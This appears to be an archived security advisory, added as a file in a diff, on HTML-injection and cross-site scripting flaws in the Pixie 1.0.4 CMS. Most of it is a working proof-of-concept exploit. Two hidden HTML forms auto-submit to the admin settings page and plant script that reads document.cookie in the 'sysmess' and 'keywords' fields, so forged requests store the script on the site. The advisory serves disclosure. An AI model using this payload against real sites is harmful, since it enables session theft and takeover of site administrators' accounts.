@@ -1,0 +1,36 @@
+source: http://www.securityfocus.com/bid/41727/info
+
+Pixie is prone to an HTML-injection vulnerability and a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage the issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials, control how the site is rendered to the user, or launch other attacks.
+
+Pixie 1.0.4 is vulnerable; other versions may also be affected.
+
+<form accept-charset="UTF-8" action="http://www.example.com/admin/index.php?s=settings&x=pixie" method="post" name="main" >
+<input type="hidden" name="langu" value="en-gb" />
+<input type="hidden" name="time_zone" value="+0" />
+<input type="hidden" name="dstime" value="no" />
+<input type="hidden" name="dateformat" value="%Oe %B %Y, %H:%M" />
+<input type="hidden" name="rte" value="1" />
+<input type="hidden" name="logs" value="5" />
+<input type="hidden" name="sysmess" value=&#039;hello message"><script>alert(document.cookie)</script>&#039; />
+<input type="submit" name="settings_edit" id="form_addedit_submit" value="Update" />
+</form>
+<script>
+document.getElementById(&#039;form_addedit_submit&#039;).click();
+</script>
+        
+<form accept-charset="UTF-8" action="http://www.example.com/admin/index.php?s=settings&x=site" method="post" name="main" >
+<input type="hidden" name="sitename" value="Pixie" />
+<input type="hidden" name="url" value="http://host/" />
+<input type="hidden" name="default" value="blog/" />
+<input type="hidden" name="keywords" value=&#039;key1"><script>alert(document.cookie)</script>&#039; />
+<input type="hidden" name="site_auth" value="sute author" />
+<input type="hidden" name="site_cright" value="copyright" />
+<input type="hidden" name="cleanurls" value="yes" />
+<input type="submit" name="settings_edit" id="form_addedit_submit" value="Update" />
+</form>
+<script>
+document.getElementById(&#039;form_addedit_submit&#039;).click();
+</script>
+        
